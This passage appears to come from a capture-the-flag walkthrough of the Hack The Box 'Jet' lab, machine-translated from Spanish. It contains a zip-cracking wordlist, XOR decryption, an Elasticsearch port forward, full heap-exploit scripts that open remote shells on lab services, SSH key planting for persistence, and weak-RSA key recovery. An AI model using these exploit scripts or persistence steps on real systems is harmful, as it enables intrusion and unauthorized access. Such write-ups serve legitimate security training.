We can create a `script`that creates combinations of `17`characters that begin with `securewebinc`, thus we create a dictionary that we will call`keys.txt`

```
#!/usr/bin/python3
import string, itertools

base = 'securewebinc'

length = 17

keys = [base + s for s in map(''.join, itertools.product(string.ascii_lowercase, repeat=length-len(base)))]  

with open('keys.txt', 'w') as file:
    for key in keys:
        file.write(key + '\n')
```

  

When we run it, it creates the file with all the passwords `combinaciones`, however we have a small problem: there are almost `12 millones`no possible passwords in total.

```
❯ python3 exploit.py  

❯ wc -l keys.txt 
11881376 keys.txt
```

  

Bruteforcing the password `xor`is complicated, however... we have a `zip`password, they may be using the `misma`, we start by creating a `hash`zip file

```
❯ zip2john exploitme.zip > hash  
```

  

By applying brute force with `john`using our `diccionario`we obtain the password of `zip`which is probably the same one used for the`xor`

```
❯ john -w:keys.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
securewebincrocks (exploitme.zip)
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.
```

  

We create a program `script`that does the `inverso`crypter process and, using the key, `securewebincrocks`tries to obtain the original content of the`message.txt`

```
#!/usr/bin/python3
import binascii

def makeList(stringVal):
    return [c for c in stringVal]

def decrypt(hexVal, keyVal):
    keyPos = 0
    key = makeList(keyVal)
    xored = b''
    for i in range(0, len(hexVal), 2):
        byte = bytes.fromhex(hexVal[i:i+2])[0]
        xored += bytes([byte ^ ord(key[keyPos])])  
        if keyPos == len(key) - 1:
            keyPos = 0
        else:
            keyPos += 1
    return xored.decode()

with open('encrypted.txt', 'rb') as f:
    content = f.read()

message = decrypt(content.hex(), 'securewebincrocks')  

print(message)
```

  

When we execute it we get the message `original`where we can see the`flag`

```
❯ python3 decrypt.py
Hello mate!

First of all an important finding regarding our website: Login is prone to SQL injection! Ask the developers to fix it asap!

Regarding your training material, I added the two binaries for the remote exploitation training in exploitme.zip. The password is the same we use to encrypt our communications.
Make sure those binaries are kept safe!

To make your life easier I have already spawned instances of the vulnerable binaries listening on our server.

The ports are 5555 and 7777.
Have fun and keep it safe!

JET{r3p3at1ng_ch4rs_1n_s1mpl3_x0r_g3ts_y0u_0wn3d}


Cheers - Alex

-----------------------------------------------------------------------------
This email and any files transmitted with it are confidential and intended solely for the use of the individual or entity to whom they are addressed. If you have received this email in error please notify the system manager. This message contains confidential information and is intended only for the individual named. If you are not the named addressee you should not disseminate, distribute or copy this e-mail. Please notify the sender immediately by e-mail if you have received this e-mail by mistake and delete this e-mail from your system. If you are not the intended recipient you are notified that disclosing, copying, distributing or taking any action in reliance on the contents of this information is strictly prohibited.  
-----------------------------------------------------------------------------
```

  

  

### Elasticity

#### JET{3sc4p3_s3qu3nc3s_4r3_fun}

  

With `netstat`we can list all the open internal ports, by doing so we can find several among them the port `9300`that is running`elasticsearch`

```
alex@jet:~$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:7777            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 10.13.37.10:9201        0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN     
tcp        0      0 10.13.37.10:53          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN     
tcp        0      0 10.13.37.10:7777        10.10.14.6:58150        ESTABLISHED
tcp        0      0 10.13.37.10:5555        10.10.14.6:53574        ESTABLISHED
tcp        0     51 10.13.37.10:47268       10.10.14.11:4444        ESTABLISHED
tcp        0    244 10.13.37.10:22          10.10.14.19:51638       ESTABLISHED  
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 ::1:953                 :::*                    LISTEN     
tcp6       0      0 127.0.0.1:9200          :::*                    LISTEN     
tcp6       0      0 127.0.0.1:9300          :::*                    LISTEN     
tcp6       0      0 :::53                   :::*                    LISTEN     
alex@jet:~$
```

  

To have access from outside we will use again `socat`to redirect what it receives from the port `8080`to the port `9300`where elasticsearch is running

```
alex@jet:~$ socat tcp-listen:8080,reuseaddr,fork tcp:localhost:9300 &  
[1] 62178
alex@jet:~$
```

  

With a program in `java`para we can connect to a `cluster`we `elasticsearch`create an object that `transporte`connects to the machine through the port `8080`by performing a simple search by the index`test`

```
import java.net.InetSocketAddress;
import java.net.InetAddress;
import java.util.Map;

import org.elasticsearch.action.admin.indices.exists.indices.IndicesExistsResponse;
import org.elasticsearch.action.admin.cluster.health.ClusterHealthResponse;
import org.elasticsearch.action.admin.indices.get.GetIndexResponse;
import org.elasticsearch.action.admin.indices.get.GetIndexRequest;
import org.elasticsearch.transport.client.PreBuiltTransportClient;
import org.elasticsearch.cluster.health.ClusterIndexHealth;
import org.elasticsearch.common.transport.TransportAddress;
import org.elasticsearch.client.transport.TransportClient;
import org.elasticsearch.action.search.SearchResponse;
import org.elasticsearch.client.IndicesAdminClient;
import org.elasticsearch.common.settings.Settings;
import org.elasticsearch.search.SearchHit;
import org.elasticsearch.client.Client;

public class Program {
    public static void main(String[] args) {
        byte[] ipAddr = new byte[]{10, 13, 37, 10};
        Client client = new PreBuiltTransportClient(Settings.EMPTY)
            .addTransportAddress(new TransportAddress(new InetSocketAddress("10.13.37.10", 8080)));  
        System.out.println(client.toString());
        ClusterHealthResponse healths = client.admin().cluster().prepareHealth().get();
        for (ClusterIndexHealth health : healths.getIndices().values()) {
            String index = health.getIndex();
            System.out.println(index);
        }
        SearchResponse searchResponse = client.prepareSearch("test").execute().actionGet();
        SearchHit[] results = searchResponse.getHits().getHits();
        for(SearchHit hit : results){
            String sourceAsString = hit.getSourceAsString();
            System.out.println(sourceAsString);
        }
        client.close();
    }
}
```

  

Now we compile it using `javac`indicating with the parameter the directory where all the jars necessary for the program `-cp`are located.`librerias`

```
❯ javac -cp "/usr/share/elasticsearch/lib/*" Program.java  
```

  

When we run the program, it returns a `json`fairly extensive page with different data, in a section of all content we can find the`flag`

```
❯ java -cp ".:/usr/share/elasticsearch/lib/*" Program | jq

{
  "timestamp": "2017-11-13 08:31",
  "subject": "Just a heads up Rob",
  "category": "admin",
  "draft": "no",
  "body": "Hey Rob - just so you know, that information you wanted has beensent."
}
{
  "timestamp": "2017-11-10 07:00",
  "subject": "Maintenance",
  "category": "maintenance",
  "draft": "no",
  "body": "Performance to our API has been reduced for a period of 3 hours. Services have been distributed across numerous suppliers, in order to reduce any future potential impact of another outage, as experienced yesterday"
}
{
  "timestamp": "2017-11-13 08:30",
  "subject": "Details for upgrades to EU-API-7",
  "category": "admin",
  "draft": "yes",
  "body": "Hey Rob, you asked for the password to the EU-API-7 instance. You didn not want me to send it on Slack, so I am putting it in here as a draft document. Delete this once you have copied the message, and don _NOT_ tell _ANYONE_. We need a better way of sharing secrets. The password is purpl3un1c0rn_1969. -Jason JET{3sc4p3_s3qu3nc3s_4r3_fun}"  
}
{
  "timestamp": "2017-11-13 13:32",
  "subject": "Upgrades complete",
  "category": "Maintenance",
  "draft": "no",
  "body": "All upgrades are complete, and normal service resumed"
}
{
  "timestamp": "2017-11-09 15:13",
  "subject": "Server outage",
  "category": "outage",
  "draft": "no",
  "body": "Due to an outage in one of our suppliers, services were unavailable for approximately 8 hours. This has now been resolved, and normal service resumed"
}
{
  "timestamp": "2017-11-13 13:40",
  "subject": "Thanks Jazz",
  "category": "admin",
  "draft": "no",
  "body": "Thanks dude - all done. You can delete our little secret. Kind regards, Rob"
}
{
  "timestamp": "2017-11-13 08:27",
  "subject": "Upgrades",
  "category": "maintenance",
  "draft": "no",
  "body": "An unscheduled maintenance period will occur at 12:00 today for approximately 1 hour. During this period, response times will be reduced while services have critical patches applied to them across all suppliers and instances"
}
```

  

  

### Member Manager

#### JET{h34p_f0r_73h_b4bi3z}

  

We had the password `zip`when decrypting the message `xor`, so we simply unzipped it, doing so left us with 2 `ejecutables`Linux files

```
❯ unzip exploitme.zip
Archive:  exploitme.zip
[exploitme.zip] membermanager password: securewebincrocks  
  inflating: membermanager           
  inflating: memo

❯ ls
 membermanager   memo
```

  

One of them is `membermanager`which when we run it locally it shows us the same thing as when we connect to the machine through the port `5555`, so we know that it runs it.

```
❯ ./membermanager  
enter your name:
test
Member manager!
1. add
2. edit
3. ban
4. change name
5. get gift
6. exit
```

  

```
❯ netcat 10.13.37.10 5555  
enter your name:
test
Member manager!
1. add
2. edit
3. ban
4. change name
5. get gift
6. exit
```

  

Actually this is a challenge from `heap`del `0x00ctf 2017`, there are many explanations on the internet, because it is somewhat long I will leave a [reference](https://0x00sec.org/t/0x00ctf-writeup-babyheap-left/5314) and we will move on to the script

```
#!/usr/bin/python3
from pwn import remote, p64, p16

shell = remote("10.13.37.10", 5555)

def add(size, data):
    shell.sendlineafter(b"6. exit", b"1")
    shell.sendlineafter(b"size:", str(size).encode())
    shell.sendlineafter(b"username:", data)

def edit(idx, mode, data):
    shell.sendline(b"2")
    shell.sendlineafter(b"2. insecure edit", str(mode).encode())  
    shell.sendlineafter(b"index:", str(idx).encode())
    shell.sendlineafter(b"username:", data)
    shell.recvuntil(b"6. exit")

def ban(idx):
    shell.sendline(b"3")
    shell.sendlineafter(b"index:", str(idx).encode())
    shell.recvuntil(b"6. exit")

def change(data):
    shell.sendline(b"4")
    shell.sendlineafter(b"name:", data)
    shell.recvuntil(b"6. exit")

shell.sendlineafter(b"name:", b"A" * 8)

add(0x88, b"A" * 0x88)
add(0x100, b"A" * 8)

payload  = b"A" * 0x160
payload += p64(0)
payload += p64(0x21)

add(0x500, payload)
add(0x88, b"A" * 8)

shell.recv()
ban(2)

payload  = b""
payload += b"A" * 0x88
payload += p16(0x281)

edit(0, 2, payload)

shell.recv()
shell.sendline(b"5")
shell.recvline()

leak_read = int(shell.recvline()[:-1], 10)
libc_base = leak_read - 0xf7250

payload  = b""
payload += p64(0) * 3
payload += p64(libc_base + 0x45390)

change(payload)

payload  = b""
payload += b"A" * 256
payload += b"/bin/sh\x00"
payload += p64(0x61)
payload += p64(0)
payload += p64(libc_base + 0x3c5520 - 0x10)
payload += p64(2)
payload += p64(3)
payload += p64(0) * 21
payload += p64(0x6020a0)

edit(1, 1, payload)

shell.sendline(b"1")
shell.sendlineafter(b"size:", str(0x80).encode())
shell.recvuntil(b"[vsyscall]")
shell.recvline()
shell.interactive()
```

  

When we run the script we get a `shell`like the user`membermanager`

```
❯ python3 exploit.py
[+] Opening connection to 10.13.37.10 on port 5555: Done
[*] Switching to interactive mode
$ id
uid=1006(membermanager) gid=1006(membermanager) groups=1006(membermanager)
$ hostname -I
10.13.37.10
$
```

  

By going to your home directory we can see the `flag`, so we simply read it

```
$ cd /home/membermanager
$ ls
flag.txt
membermanager
$ cat flag.txt
JET{h34p_f0r_73h_b4bi3z}

                                                 __----~~~~~~~~~~~------___
                                      .  .   ~~//====......          __--~ ~~  
                      -.            \_|//     |||\\  ~~~~~~::::... /~
                   ___-==_       _-~o~  \/    |||  \\            _/~~-
           __---~~~.==~||\=_    -_--~/_-~|-   |\\   \\        _/~
       _-~~     .=~    |  \\-_    '-~7  /-   /  ||    \      /
     .~       .~       |   \\ -_    /  /-   /   ||      \   /
    /  ____  /         |     \\ ~-_/  /|- _/   .||       \ /
    |~~    ~~|--~~~~--_ \     ~==-/   | \~--===~~        .\
             '         ~-|      /|    |-~\~~       __--~~
                         |-~~-_/ |    |   ~\_   _-~            /\
                              /  \     \__   \/~                \__
                          _--~ _/ | .-~~____--~-/                  ~~==.
                         ((->/~   '.|||' -_|    ~~-/ ,              . _||
                                    -_     ~\      ~~---l__i__i__i--~~_/
                                    _-~-__   ~)  \--______________--~~
                                  //.-~~~-~_--~- |-------~~~~~~~~
                                         //.-~~~--\
$
```

  

Again we are going to write our password `publica`as a password `autorizada`on the victim machine so that later we can connect without a password by`ssh`

```
$ mkdir .ssh
$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE7DwLVBJlEPeKvWMKsQTsU7m4ULfVSJRx1hVaZAo0Rv kali@kali" > .ssh/authorized_keys  
$
```

  

```
❯ ssh membermanager@10.13.37.10
membermanager@jet:~$ id
uid=1006(membermanager) gid=1006(membermanager) groups=1006(membermanager)  
membermanager@jet:~$ hostname -I
10.13.37.10
membermanager@jet:~$ head -n1 flag.txt 
JET{h34p_f0r_73h_b4bi3z}
membermanager@jet:~$
```

  

  

### More Secrets

#### JET{n3xt_t1m3_p1ck_65537}

  

In the `home`user's directory `tony`we can find we have 2 files with an extension `.enc`and a public key which has the name`public.crt`

```
membermanager@jet:/home/tony$ ls -l *
-rw-r--r-- 1 root root  129 Dec 28  2017 key.bin.enc  
-rw-r--r-- 1 root root 4768 Dec 28  2017 secret.enc

keys:
-rw-r--r-- 1 root root 451 Dec 28  2017 public.crt
membermanager@jet:/home/tony$
```

  

To work locally we can download the files using `recursiva`the `scp`connection `ssh`we have

```
❯ scp -r membermanager@10.13.37.10:"/home/tony/*" .
key.bin.enc                                  100%  129     0.7KB/s   00:00
public.crt                                   100%  451     2.3KB/s   00:00
secret.enc                                   100% 4768    24.5KB/s   00:00  

❯ tree 
.
├── key.bin.enc
├── keys
│   └── public.crt
└── secret.enc

2 directories, 3 files
```

  

In the directory `keys`we have a `publica`really small key

```
❯ cat public.crt
-----BEGIN PUBLIC KEY-----
MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQGN24SSfsyl/rFafZuCr54a
BqEpk9fJDFa78Qnk177LTPwWgJPdgY6ZZC9w7LWuy9+fSFfDnF4PI3DRPDpvvqmB
jQh7jykg7N4FUC5dkqx4gBw+dfDfytHR1LeesYfJI6KF7s0FQhYOioCVyYGmNQop
lt34bxbXgVvJZUMfBFC6LQKBgQCkzWwClLUdx08Ezef0+356nNLVml7eZvTJkKjl
2M6sE8sHiedfyQ4Hvro2yfkrMObcEZHPnIba0wZ/8+cgzNxpNmtkG/CvNrZY81iw
2lpm81KVmMIG0oEHy9V8RviVOGRWi2CItuiV3AUIjKXT/TjdqXcW/n4fJ+8YuAML  
UCV4ew==
-----END PUBLIC KEY-----
```

  

Let's start by obtaining its values, using the library `Crypto`we can open our key and with a simple one `script`obtain only 2 of its values, which are `e`and`n`

```
#!/usr/bin/python3
from Crypto.PublicKey import RSA

file = open("public.crt", "r")
key = RSA.importKey(file.read())  

e = key.e
n = key.n

print(f"e: {e}")
print(f"n: {n}")
```

  

```
❯ python3 exploit.py
e: 115728201506489397643589591830500007746878464402967704982363700915688393155096410811047118175765086121588434953079310523301854568599734584654768149408899986656923460781694820228958486051062289463159083249451765181542090541790670495984616833698973258382485825161532243684668955906382399758900023843171772758139  
n: 279385031788393610858518717453056412444145495766410875686980235557742299199283546857513839333930590575663488845198789276666170586375899922998595095471683002939080133549133889553219070283957020528434872654142950289279547457733798902426768025806617712953244255251183937835355856887579737717734226688732856105517
```

  

In this case the key is quite a bit `pequeña`, we must keep in mind that the value of `n`is the result of the multiplication of 2 prime numbers, if we use [factordb.com](http://factordb.com/) we manage to factorize `n`, the 2 numbers that it returns are defined as `p`and`q`

[

![](https://xchg2pwn.github.io/fortresses/jet/26.png)





```
p = 13833273097933021985630468334687187177001607666479238521775648656526441488361370235548415506716907370813187548915118647319766004327241150104265530014047083  
q = 20196596265430451980613413306694721666228452787816468878984356787652099472230934129158246711299695135541067207646281901620878148034692171475252446937792199  
```

  

The value of `m`is defined as the result of `n`minus the result of`p + q - 1`

```
m = n - (p + q - 1)  
```

  

The variable `d`is defined as the result of the inverse multiplicative modular function of `e`and `m`, so it is also necessary to define the modinv [function](https://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python) in python

```
def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)  

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise
    else:
        return x % m

d = modinv(e, m)
```

  

If we get all these values ​​we can `construir`and show the private key

```
key = RSA.construct((n, e, d, p, q))  
print(key.exportKey().decode())
```

  

Our `script`end would be as follows and when executed it builds and shows us the key on the screen `privada`based on the values ​​obtained

```
#!/usr/bin/python3
from Crypto.PublicKey import RSA

file = open("public.crt", "r")
key = RSA.importKey(file.read())

e = key.e
n = key.n

p = 13833273097933021985630468334687187177001607666479238521775648656526441488361370235548415506716907370813187548915118647319766004327241150104265530014047083  
q = 20196596265430451980613413306694721666228452787816468878984356787652099472230934129158246711299695135541067207646281901620878148034692171475252446937792199  

m = n - (p + q - 1)

def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise
    else:
        return x % m

d = modinv(e, m)

key = RSA.construct((n, e, d, p, q))
print(key.exportKey().decode())
```

  

```
❯ python3 exploit.py
-----BEGIN RSA PRIVATE KEY-----
MIICOQIBAAKBgQGN24SSfsyl/rFafZuCr54aBqEpk9fJDFa78Qnk177LTPwWgJPd
gY6ZZC9w7LWuy9+fSFfDnF4PI3DRPDpvvqmBjQh7jykg7N4FUC5dkqx4gBw+dfDf
ytHR1LeesYfJI6KF7s0FQhYOioCVyYGmNQoplt34bxbXgVvJZUMfBFC6LQKBgQCk
zWwClLUdx08Ezef0+356nNLVml7eZvTJkKjl2M6sE8sHiedfyQ4Hvro2yfkrMObc
EZHPnIba0wZ/8+cgzNxpNmtkG/CvNrZY81iw2lpm81KVmMIG0oEHy9V8RviVOGRW
i2CItuiV3AUIjKXT/TjdqXcW/n4fJ+8YuAMLUCV4ewIgSJiewFB8qwlK2nqa7taz
d6DQtCKbEwXMl4BUeiJVRkcCQQEIH6FjRIVKckAWdknyGOzk3uO0fTEH9+097y0B
A5OBHosBfo0agYxd5M06M4sNzodxqnRtfgd7R8C0dsrnBhtrAkEBgZ7n+h78BMxC
h6yTdJ5rMTFv3a7/hGGcpCucYiadTIxfIR0R1ey8/Oqe4HgwWz9YKZ1re02bL9fn
cIKouKi+xwIgSJiewFB8qwlK2nqa7tazd6DQtCKbEwXMl4BUeiJVRkcCIEiYnsBQ
fKsJStp6mu7Ws3eg0LQimxMFzJeAVHoiVUZHAkA3pS0IKm+cCT6r0fObMnPKoxur  
bzwDyPPczkvzOAyTGsGUfeHhseLHZKVAvqzLbrEdTFo906cZWpLJAIEt8SD9
-----END RSA PRIVATE KEY-----
```

  

However, this is optional since `RsaCtfTool`we obtain the same result in an automated way by passing the public key and a type attack`wiener`

```
❯ RsaCtfTool --publickey public.crt --private --attack wiener

[*] Testing key public.crt.
[*] Performing wiener attack on public.crt.
 25%|██████████▊                                | 154/612 [36628.83it/s]  
[*] Attack success with wiener method !

Results for public.crt:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIICOQIBAAKBgQGN24SSfsyl/rFafZuCr54aBqEpk9fJDFa78Qnk177LTPwWgJPd
gY6ZZC9w7LWuy9+fSFfDnF4PI3DRPDpvvqmBjQh7jykg7N4FUC5dkqx4gBw+dfDf
ytHR1LeesYfJI6KF7s0FQhYOioCVyYGmNQoplt34bxbXgVvJZUMfBFC6LQKBgQCk
zWwClLUdx08Ezef0+356nNLVml7eZvTJkKjl2M6sE8sHiedfyQ4Hvro2yfkrMObc
EZHPnIba0wZ/8+cgzNxpNmtkG/CvNrZY81iw2lpm81KVmMIG0oEHy9V8RviVOGRW
i2CItuiV3AUIjKXT/TjdqXcW/n4fJ+8YuAMLUCV4ewIgSJiewFB8qwlK2nqa7taz
d6DQtCKbEwXMl4BUeiJVRkcCQQEIH6FjRIVKckAWdknyGOzk3uO0fTEH9+097y0B
A5OBHosBfo0agYxd5M06M4sNzodxqnRtfgd7R8C0dsrnBhtrAkEBgZ7n+h78BMxC
h6yTdJ5rMTFv3a7/hGGcpCucYiadTIxfIR0R1ey8/Oqe4HgwWz9YKZ1re02bL9fn
cIKouKi+xwIgSJiewFB8qwlK2nqa7tazd6DQtCKbEwXMl4BUeiJVRkcCIEiYnsBQ
fKsJStp6mu7Ws3eg0LQimxMFzJeAVHoiVUZHAkA3pS0IKm+cCT6r0fObMnPKoxur
bzwDyPPczkvzOAyTGsGUfeHhseLHZKVAvqzLbrEdTFo906cZWpLJAIEt8SD9
-----END RSA PRIVATE KEY-----
```

  

We save the key in a file called `private.crt`and with `openssl`we decrypt the file `key.bin.enc`which is a file that can be used as a password

```
❯ openssl pkeyutl -decrypt -inkey private.crt -in key.bin.enc -out file  
```

  

Now using the file `file`created by the previous command as `filepass`in `openssl`we can uncode the file `secret.enc`and see the `flag`in the message

```
❯ openssl aes-256-cbc -d -in secret.enc -pass file:file

 ▄▄▄██▀▀▀▓█████▄▄▄█████▓      ▄████▄   ▒█████   ███▄ ▄███▓                                                                                                   
   ▒██   ▓█   ▀▓  ██▒ ▓▒     ▒██▀ ▀█  ▒██▒  ██▒▓██▒▀█▀ ██▒    Congratulations!!                                                           
   ░██   ▒███  ▒ ▓██░ ▒░     ▒▓█    ▄ ▒██░  ██▒▓██    ▓██░                                                                                      
▓██▄██▓  ▒▓█  ▄░ ▓██▓ ░      ▒▓▓▄ ▄██▒▒██   ██░▒██    ▒██     Jet: https://jet.com/careers                                                           
 ▓███▒   ░▒████▒ ▒██▒ ░  ██▓ ▒ ▓███▀ ░░ ████▓▒░▒██▒   ░██▒    HTB: https://www.hackthebox.eu                                                     
 ▒▓▒▒░   ░░ ▒░ ░ ▒ ░░    ▒▓▒ ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ░  ░                                                                                                     
 ▒ ░▒░    ░ ░  ░   ░     ░▒    ░  ▒     ░ ▒ ▒░ ░  ░      ░    JET{n3xt_t1m3_p1ck_65537}                                                              
 ░ ░ ░      ░    ░       ░   ░        ░ ░ ░ ▒  ░      ░                                                                                                        
 ░   ░      ░  ░          ░  ░ ░          ░ ░         ░                                                                                                        
                          ░  ░                                                                                                                                 
                                  Props to:           ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀▄▄▄█████▓ ██░ ██ ▓█████  ▄▄▄▄    ▒█████  ▒██   ██▒     ▓█████  █    ██ 
                                                      ▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓  ██▒ ▓▒▓██░ ██▒▓█   ▀ ▓█████▄ ▒██▒  ██▒▒▒ █ █ ▒░     ▓█   ▀  ██  ▓██▒
                                      blink (jet)     ▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒ ▓██░ ▒░▒██▀▀██░▒███   ▒██▒ ▄██▒██░  ██▒░░  █   ░     ▒███   ▓██  ▒██░  
                                      g0blin (htb)    ░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄ ▒██░█▀  ▒██   ██░ ░ █ █ ▒      ▒▓█  ▄ ▓▓█  ░██░
                                      forGP (htb)     ░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄  ▒██▒ ░ ░▓█▒░██▓░▒████▒░▓█  ▀█▓░ ████▓▒░▒██▒ ▒██▒ ██▓ ░▒████▒▒▒█████▓ 
                                      ch4p (htb)       ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒  ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░░▒▓███▀▒░ ▒░▒░▒░ ▒▒ ░ ░▓ ░ ▒▓▒ ░░ ▒░ ░░▒▓▒ ▒ ▒ 
                                      xero (0x00sec)   ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░    ░     ▒ ░▒░ ░ ░ ░  ░▒░▒   ░   ░ ▒ ▒░ ░░   ░▒ ░ ░▒   ░ ░  ░░░▒░ ░ ░ 
                                                       ░  ░░ ░  ░   ▒   ░        ░ ░░ ░   ░       ░  ░░ ░   ░    ░    ░ ░ ░ ░ ▒   ░    ░   ░      ░    ░░░ ░ ░ 
                                                       ░  ░  ░      ░  ░░ ░      ░  ░             ░  ░  ░   ░  ░ ░          ░ ░   ░    ░    ░     ░  ░   ░     
                                                                        ░                                             ░                     ░                 
```

  

  

### Memo

#### JET{7h47s_7h3_sp1r17}

  

The last challenge involves the binary `memo`that we found before along with the other one, which we can see is the same service that is running on the port`7777`

```
❯ ./memo

--==[[ Spiritual Memo ]]==--  

[1] Create a memo
[2] Show memo
[3] Delete memo
[4] Tap out
>
```

  

```
❯ netcat 10.13.37.10 7777  

--==[[ Spiritual Memo ]]==--

[1] Create a memo
[2] Show memo
[3] Delete memo
[4] Tap out
>
```

  

We find ourselves again with a heap overflow challenge that is `ctf`again quite long, let's go directly to the `script`end of exploitation

```
#!/usr/bin/python3
from pwn import remote, p64, u64

shell = remote("10.13.37.10", 7777)

def create_memo(data, answer, more):
    shell.sendlineafter(b"> ", b"1")
    shell.sendlineafter(b"Data: ", data)
    if answer[:3] == "yes":
        shell.sendafter(b"[yes/no] ", answer.encode())
    else:
        shell.sendafter(b"[yes/no] ", answer)
        shell.sendafter(b"Data: ", more)

def show_memo():
    shell.sendlineafter(b"> ", b"2")
    shell.recvuntil(b"Data: ")

def delete_memo():
    shell.sendlineafter(b"> ", b"3")

def tap_out(answer):
    shell.sendlineafter(b"> ", b"4")
    shell.sendafter(b"[yes/no] ", answer)

create_memo(b"A" * 0x1f, b"no", b"A" * 0x1f)
show_memo()
shell.recv(0x20)

stack_chunk = u64(shell.recv(6) + b"\x00" * 2) - 0x110

delete_memo()
create_memo(b"A" * 0x28, b"no", b"A" * 0x28)
show_memo()
shell.recvuntil(b"A" * 0x28)
shell.recv(1)

canary = u64(b"\x00" + shell.recv(7))

create_memo(b"A" * 0x18, b"no", b"A" * 0x18)
create_memo(b"A" * 0x18, b"no", b"A" * 0x17)
show_memo()
shell.recvuntil(b"A" * 0x18)
shell.recv(1)

heap = u64(b"\x00" + shell.recv(3).ljust(7, b"\x00"))

create_memo(b"A" * 0x18, b"no", b"A" * 0x8 + p64(0x91) + b"A" * 0x8)
create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8)
create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8)
create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8)
create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8 + p64(0x31))
create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8)

tap_out(b"no\x00" + b"A" * 21 + p64(heap + 0xe0))
delete_memo()
tap_out(b"no\x00" + b"A" * 21 + p64(heap + 0xc0))
delete_memo()
show_memo()

leak = u64(shell.recv(6).ljust(8, b"\x00"))
libc = leak - 0x3c4b78

create_memo(b"A" * 0x28, b"no", b"A" * 0x10 + p64(0x0) + p64(0x21) + p64(stack_chunk))
create_memo(p64(leak) * (0x28 // 8), b"no", b"A" * 0x28)
create_memo(b"A" * 0x8 + p64(0x21) + p64(stack_chunk + 0x18) + b"A" * 0x8 + p64(0x21), "yes", b"")  
create_memo(b"A" * 0x8, b"no", p64(canary) + b"A" * 0x8 + p64(libc + 0x45216))

tap_out(b"yes\x00")

shell.recvline()
shell.interactive()
```

  

When we execute it we get a shell like `memo`and in its home we can see the`flag`

```
❯ python3 memo.py
[+] Opening connection to 10.13.37.10 on port 7777: Done
[*] Switching to interactive mode
$ id
uid=1007(memo) gid=1007(memo) groups=1007(memo)
$ hostname -I
10.13.37.10 
$ cd /home/memo
$ ls
flag.txt
memo
$ cat flag.txt
Congrats! JET{7h47s_7h3_sp1r17}

                               .\
                         .\   / _\   .\
                        /_ \   ||   / _\
                         ||    ||    ||
                  ; ,     \`.__||__.'/
          |\     /( ;\_.;  `./|  __.'
          ' `.  _|_\/_;-'_ .' '||
           \ _/`       `.-\_ / ||      _
       , _ _`; ,--.   ,--. ;'_ _|,     |
       '`''\| /  ,-\ | _,-\ |/''`'  _  |
        \ .-- \__\_/ /` )_/ --. /   |  |       _
        /    .         -'  .    \ --|--|--.  .' \
       |     /             \     |  |  |   \ |---'
    .   .  -' `-..____...-' `-  .   |  |    |\  _
 .'`'.__ `._      `-..-''    _.'|   |  | _  | `-'      _
  \ .--.`.  `-..__    _,..-'   L|   |    |             |
   '    \ \      _,| |,_      /_7)  |    |   _       _ |  _
         \ \    /       \ _.-'/||        | .' \     _| |  |
          \ \  /.'|   |`.__.'` ||     .--| |--- _   /| |  |
           \ `//_/     \       ||    /   | \  _ \  / | |  |
            `/ \|       |      ||   |    |  `-'  \/  | '--|      _
             `"`'.  _  .'      ||    `--'|                |   .--/  
                  \ | /        ||                         '--'
                   |'|  mx     'J        made me do it! ;)
                .-.|||.-.
               '----"----'
$
```

  

Again we send our password `publica`to the directory `.ssh`as a key `autorizada`so we can connect and get a shell `ssh`without a password

```
$ mkdir .ssh
$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE7DwLVBJlEPeKvWMKsQTsU7m4ULfVSJRx1hVaZAo0Rv kali@kali" > .ssh/authorized_keys  
$
```

  

```
❯ ssh memo@10.13.37.10
memo@jet:~$ id
uid=1007(memo) gid=1007(memo) groups=1007(memo)  
memo@jet:~$ hostname -I
10.13.37.10 
memo@jet:~$ head -n1 flag.txt 
Congrats! JET{7h47s_7h3_sp1r17}
memo@jet:~$
```